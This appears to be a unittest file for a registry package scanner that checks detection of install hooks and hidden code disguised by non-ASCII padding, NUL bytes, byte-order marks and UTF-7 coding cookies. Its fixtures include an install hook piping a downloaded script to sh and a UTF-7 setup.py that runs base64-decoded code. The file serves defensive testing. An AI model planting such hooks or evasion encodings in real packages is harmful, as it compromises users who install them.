"""Review findings 1 and 8: how registry members are decoded before scanning.

1. Text vs binary used to be decided from the first 2 KB (>30% non-ASCII or a
   NUL in the first 1 KB => "binary" => never scanned), so a package.json with
   an accented description, or a .js/.py with a NUL or non-ASCII comment at
   the top, came out OK. Source-extension and manifest members are now always
   decoded and scanned; only invalid UTF-8 / control bytes count as non-text,
   and a source file that is not text at all makes the scan INCOMPLETE.
8. PEP 263 coding cookies were ignored: `# -*- coding: utf-7 -*-` hides code
   in what reads as a comment. decode_source() honors the cookie, scans the
   decoded text and adds SC-UTF7.
Registry side; looks_binary / decode_source themselves are in
test_review_core.py.
"""

import unittest

from tests.registry._review_support import (
    DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, hooks, manifest, rules, scan_npm, scan_sdist)

PAD = "é" * 800                          # 1600 valid non-ASCII bytes
UTF7_SETUP = ("# -*- coding: utf-7 -*-\n"
              "#+AAo-import base64+ADs-exec(base64.b64decode(+ACc-cHJpbnQoMSk=+ACc-))\n")


class RegistryDecodingTests(unittest.TestCase):
    def test_non_ascii_description_does_not_hide_hooks(self):
        res = scan_npm({"package.json": manifest(description=PAD,
                                                 scripts={"install": "curl -s http://192.0.2.1/x | sh"})})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_non_ascii_comment_does_not_hide_code(self):
        for path, body in (("index.js", "// " + PAD + "\n" + DECODE_EXEC_JS),
                           ("setup.py", "# " + PAD + "\n" + DECODE_EXEC_PY)):
            with self.subTest(path=path):
                res = scan_npm({"package.json": manifest(), path: body})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_nul_in_a_leading_comment_does_not_hide_code(self):
        res = scan_npm({"package.json": manifest(), "index.js": "/*\x00*/\n" + DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertEqual(res["filesScanned"], 1)

    def test_oversize_source_starting_with_nuls_is_incomplete(self):
        big = b"\x00" * 4096 + b"// x\n" * 250_000
        res = scan_npm({"package.json": manifest(), "dist/huge.js": big})
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])
        self.assertGreaterEqual(res["truncated"], 1)

    def test_source_file_that_is_not_text_is_incomplete(self):
        res = scan_npm({"package.json": manifest(), "lib/index.js": bytes(range(256)) * 16})
        self.assertIn(res["verdict"], ("INCOMPLETE", "SUSPICIOUS"))
        self.assertIn("SC-TRUNCATED", rules(res))

    def test_elf_named_js_is_reported_as_a_binary_too(self):
        res = scan_npm({"package.json": manifest(), "lib/index.js": ELF + bytes(range(256)) * 8})
        self.assertIn("SC-BINARY", rules(res))
        self.assertIn("SC-TRUNCATED", rules(res))

    def test_utf7_setup_py_is_suspicious(self):
        res = scan_sdist({"setup.py": UTF7_SETUP})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("SC-UTF7", rules(res, ("CRITICAL",)))
        # the decoded code itself is scanned too
        self.assertIn("SC-EVAL-DECODE", rules(res))

    def test_bom_package_json_hooks_are_seen(self):
        res = scan_npm({"package.json": "﻿" + hooks(install="curl -s http://192.0.2.1/x | sh")})
        self.assertEqual(res["verdict"], "SUSPICIOUS")


if __name__ == "__main__":
    unittest.main()
